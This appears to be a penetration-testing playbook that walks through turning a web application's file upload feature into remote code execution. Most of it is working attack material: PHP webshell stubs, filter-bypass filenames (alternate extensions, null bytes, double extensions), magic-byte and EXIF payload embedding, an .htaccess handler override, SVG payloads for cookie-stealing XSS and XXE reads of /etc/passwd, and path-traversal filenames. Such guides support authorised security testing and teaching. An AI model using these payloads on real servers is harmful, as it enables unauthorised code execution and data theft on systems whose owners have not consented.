# Scenario: File Upload to RCE Workflow

## Objective
Upload a malicious file to achieve Remote Code Execution on the target server by bypassing file upload validation.

---

## Phase 1: Reconnaissance

### Step 1: Identify upload functionality
Find any feature that accepts file input:
- Profile picture / avatar
- Document upload (resume, report, attachment)
- Import feature (CSV, XML, JSON)
- Media upload (images, videos)
- Support ticket attachments

### Step 2: Understand the upload behavior
Upload a legitimate file (e.g., `test.jpg`) and observe:
- Where is the file stored? (check response for URL)
- Can you access the file directly? (browse to the URL)
- What server technology is running? (PHP, Java, .NET, Node)
- What's the naming convention? (original name? randomized? hashed?)

---

## Phase 2: Basic Upload Attempts

### Step 3: Upload a simple webshell
```php
<!-- shell.php -->
<?php echo "shell output"; ?>
```

If this uploads and is accessible → execution confirmed. Access via `https://target.com/uploads/shell.php`.

### Step 4: If blocked, identify the filter type

| Behavior | Filter type |
|----------|------------|
| "File type not allowed" | Extension-based filter |
| "Invalid file" with valid extension | Content-Type or magic byte check |
| File uploads but doesn't execute | Server doesn't execute in upload dir |
| File gets renamed | Filename sanitization |

---

## Phase 3: Bypass Techniques (try each in order)

### Step 5: Extension bypass
Try alternative executable extensions:
```
PHP:  .php5, .php7, .phtml, .phar, .phps, .pht
JSP:  .jspx, .jsw, .jsv, .jspf
ASP:  .aspx, .ashx, .asmx, .cer, .asp;.jpg
```

### Step 6: Double extension and null byte
```
shell.php.jpg
shell.php%00.jpg
shell.php.
shell.php....jpg
shell.jpg.php
```

### Step 7: Case variation
```
shell.PhP
shell.pHP
shell.PHP
```

### Step 8: Content-Type spoofing
Intercept the upload request in Burp and change:
```http
Content-Type: image/jpeg
```
While the file body remains PHP code.

### Step 9: Magic byte prepending
Add valid image headers before the PHP code:
```bash
# PNG header + PHP
printf '\x89PNG\r\n\x1a\n<?php echo "shell"; ?>' > shell.png.php

# JPEG header + PHP
printf '\xFF\xD8\xFF\xE0<?php echo "shell"; ?>' > shell.jpg.php

# GIF header + PHP
printf 'GIF89a<?php echo "shell"; ?>' > shell.gif.php
```

### Step 10: Embed in image metadata
```bash
exiftool -Comment='<?php echo "shell"; ?>' legitimate.jpg
# Rename to .php if needed
cp legitimate.jpg shell.php
```

### Step 11: Upload .htaccess (Apache only)
If `.htaccess` upload is allowed:
```apache
AddType application/x-httpd-php .jpg
```
Now upload `shell.jpg` with PHP content: it will execute as PHP.

---

## Phase 4: Alternative Attack Vectors

### Step 12: SVG for stored XSS
```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>
```

### Step 13: SVG for XXE (file read)
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

### Step 14: Path traversal via filename
Intercept upload request and modify the filename:
```
filename="../../../var/www/html/shell.php"
filename="....//....//....//var/www/html/shell.php"
```

### Step 15: Race condition upload
If files are uploaded then validated/deleted:
Rapid upload + access loop via Burp Intruder to access the file in the split-second before it is deleted.

---

## Post-Exploitation
- Verify execution context
- Upgrade to a proper reverse shell if possible (using harmless techniques to verify first)
- Write up PoC demonstrating the risk

## Tools
- `Burp Suite`: Intercept and modify upload requests
- `exiftool`: Embed payloads in image metadata
- `Fuxploider`: Automated file upload vulnerability scanner
- `Weevely`: Generate encrypted PHP webshells

## References
- `techniques/file-upload-vulnerabilities.md`
- `techniques/xxe-injection.md`
- `methodology/exploitation-methodology.md`
